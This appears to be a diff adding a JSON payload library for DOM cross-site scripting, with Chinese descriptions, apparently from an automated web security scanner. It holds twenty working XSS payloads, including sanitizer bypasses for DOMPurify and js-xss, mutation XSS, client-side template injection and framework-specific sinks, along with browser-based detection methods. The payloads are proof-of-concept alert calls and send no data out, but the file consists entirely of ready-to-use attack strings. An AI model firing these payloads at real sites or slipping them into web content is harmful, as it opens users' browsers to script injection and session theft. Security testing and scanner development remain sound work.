@@ -1,0 +1,225 @@
+{
+  "category": "DOM Cross-Site Scripting (DOM XSS)",
+  "version": "3.0",
+  "description": "DOM XSS 专用 payload 库（参考示例）",
+  "note": "⚠️ 参考说明：本 payload 库仅供参考，实际测试应根据目标前端框架、sink 点等动态选择和构造 payload。需要使用浏览器自动化工具 (Playwright/Selenium) 执行。",
+  "payloads": [
+    {
+      "id": "dom-001",
+      "name": "jQuery location.hash XSS",
+      "payload": "<script>$(location.hash).trigger('click')</script>",
+      "type": "dom",
+      "sink": "jQuery",
+      "library": "jQuery",
+      "detection_method": "browser_console",
+      "severity": "high"
+    },
+    {
+      "id": "dom-002",
+      "name": "Angular ng-app XSS",
+      "payload": "<div ng-app>{{constructor.constructor('alert(1)')()}}</div>",
+      "type": "dom",
+      "sink": "AngularJS",
+      "library": "AngularJS",
+      "detection_method": "browser_console",
+      "severity": "high"
+    },
+    {
+      "id": "dom-003",
+      "name": "Vue.js v-html XSS",
+      "payload": "<div v-html=\"$event.user\"></div>",
+      "type": "dom",
+      "sink": "Vue.js",
+      "library": "Vue.js",
+      "detection_method": "dom_observation",
+      "severity": "high"
+    },
+    {
+      "id": "dom-004",
+      "name": "React dangerouslySetInnerHTML XSS",
+      "payload": "<div dangerouslySetInnerHTML={{__html: 'alert(1)'}} />",
+      "type": "dom",
+      "sink": "React",
+      "library": "React",
+      "detection_method": "browser_console",
+      "severity": "critical"
+    },
+    {
+      "id": "dom-005",
+      "name": "URL Fragment Injection",
+      "payload": "#<img src=x onerror=alert(1)>",
+      "type": "dom",
+      "sink": "location.hash",
+      "detection_method": "dom_observation",
+      "severity": "medium"
+    },
+    {
+      "id": "dom-006",
+      "name": "postMessage XSS",
+      "payload": "<iframe src=\"${targetUrl}\" onload=\"this.contentWindow.postMessage('${payload}', '*')\">",
+      "type": "dom",
+      "sink": "postMessage",
+      "detection_method": "browser_console",
+      "severity": "high"
+    },
+    {
+      "id": "dom-007",
+      "name": "localStorage Injection",
+      "payload": "<script>localStorage.setItem('malicious', 'alert(1)');</script>",
+      "type": "stored",
+      "sink": "localStorage",
+      "detection_method": "storage_inspection",
+      "severity": "medium"
+    },
+    {
+      "id": "dom-008",
+      "name": "Cookie Injection",
+      "payload": "<script>document.cookie='xss=alert(1)';</script>",
+      "type": "stored",
+      "sink": "document.cookie",
+      "detection_method": "cookie_inspection",
+      "severity": "medium"
+    },
+    {
+      "id": "dom-009",
+      "name": "innerHTML with Script",
+      "payload": "<div id=\"x\"></div><script>document.getElementById('x').innerHTML='<img src=x onerror=alert(1)>';</script>",
+      "type": "dom",
+      "sink": "innerHTML",
+      "detection_method": "dom_observation",
+      "severity": "high"
+    },
+    {
+      "id": "dom-010",
+      "name": "document.write XSS",
+      "payload": "<script>document.write('<img src=x onerror=alert(1)>');</script>",
+      "type": "dom",
+      "sink": "document.write",
+      "detection_method": "dom_observation",
+      "severity": "high"
+    },
+    {
+      "id": "dom-011",
+      "name": "eval() Injection",
+      "payload": "?data=alert(1)<script>eval(location.search.split('data=')[1])</script>",
+      "type": "dom",
+      "sink": "eval",
+      "detection_method": "browser_console",
+      "severity": "critical"
+    },
+    {
+      "id": "dom-012",
+      "name": "setTimeout Injection",
+      "payload": "<script>setTimeout('alert(1)', 1000)</script>",
+      "type": "dom",
+      "sink": "setTimeout",
+      "detection_method": "browser_console",
+      "severity": "high"
+    },
+    {
+      "id": "dom-013",
+      "name": "template literal Injection",
+      "payload": "<script>eval(`alert(1)`)</script>",
+      "type": "dom",
+      "sink": "template_literal",
+      "detection_method": "browser_console",
+      "severity": "high"
+    },
+    {
+      "id": "dom-014",
+      "name": "Fetch/eval Chain",
+      "payload": "<script>fetch('data:text/html,<script>alert(1)</script>').then(r=>r.text()).then(t=>eval(t))</script>",
+      "type": "dom",
+      "sink": "eval",
+      "detection_method": "browser_console",
+      "severity": "critical"
+    },
+    {
+      "id": "dom-015",
+      "name": "Mutation XSS (mXSS)",
+      "payload": "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
+      "type": "dom",
+      "sink": "mutation",
+      "detection_method": "dom_observation",
+      "severity": "high"
+    },
+    {
+      "id": "dom-016",
+      "name": "DOMPurify Bypass",
+      "payload": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+      "type": "dom",
+      "sink": "DOMPurify",
+      "bypass": "noscript_mutation",
+      "detection_method": "browser_console",
+      "severity": "high"
+    },
+    {
+      "id": "dom-017",
+      "name": "js-xss Bypass",
+      "payload": "<svg><style><img src=x onerror=alert(1)></style></svg>",
+      "type": "dom",
+      "sink": "js-xss",
+      "bypass": "style_mutation",
+      "detection_method": "dom_observation",
+      "severity": "high"
+    },
+    {
+      "id": "dom-018",
+      "name": "Client Side Template Injection - Handlebars",
+      "payload": "{{constructor.constructor('alert(1)')()}}",
+      "type": "ssti",
+      "sink": "Handlebars",
+      "detection_method": "browser_console",
+      "severity": "critical"
+    },
+    {
+      "id": "dom-019",
+      "name": "Client Side Template Injection - Underscore",
+      "payload": "<%= alert(1) %>",
+      "type": "ssti",
+      "sink": "Underscore.js",
+      "detection_method": "browser_console",
+      "severity": "critical"
+    },
+    {
+      "id": "dom-020",
+      "name": "Client Side Template Injection - Lodash Template",
+      "payload": "<%= alert(1) %>",
+      "type": "ssti",
+      "sink": "Lodash",
+      "detection_method": "browser_console",
+      "severity": "critical"
+    }
+  ],
+  "detection_methods": {
+    "browser_console": {
+      "description": "通过浏览器控制台检测 JS 执行",
+      "payload_pattern": "console.log('XSS_MARKER')",
+      "marker": "XSS_MARKER"
+    },
+    "dom_observation": {
+      "description": "观察 DOM 中是否出现 payload",
+      "check": "payload in page.content()"
+    },
+    "storage_inspection": {
+      "description": "检查 localStorage/sessionStorage",
+      "check": "localStorage.getItem('malicious')"
+    },
+    "cookie_inspection": {
+      "description": "检查 cookie 是否被设置",
+      "check": "document.cookie"
+    },
+    "alert_capture": {
+      "description": "劫持 alert() 检测弹窗触发",
+      "payload": "<script>window.alert=function(){console.log('XSS_ALERT_TRIGGERED')}</script>"
+    }
+  },
+  "metadata": {
+    "total_payloads": 20,
+    "types": ["dom", "stored", "ssti", "mXss"],
+    "sinks": ["innerHTML", "eval", "document.write", "location.hash", "postMessage", "jQuery", "Vue", "React", "Angular"],
+    "frameworks": ["jQuery", "Vue.js", "React", "AngularJS", "Handlebars", "Underscore", "Lodash", "DOMPurify"],
+    "browsers": ["Chrome", "Firefox", "Safari", "Edge"],
+    "last_updated": "2026-03-31"
+  }
+}
